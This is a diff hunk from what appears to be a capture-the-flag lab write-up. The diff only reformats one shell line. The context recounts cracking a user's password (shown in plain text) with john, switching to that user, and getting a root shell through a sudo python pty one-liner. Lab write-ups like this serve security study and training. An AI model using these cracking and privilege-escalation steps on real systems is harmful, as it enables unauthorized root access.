@@ -198,7 +198,7 @@ mysql> select * from wp_users;
 
 Was able to use 'john' to crack the password for Steven (pink84), and then use that to escalate privileges and fine flag4:
 
-michael@target1:~$ su - steven
+> michael@target1:~$ su - steven
 Password:
 $ sudo python -c 'import pty;pty.spawn("/bin/bash")'        
 root@target1:/home/steven# cd /root
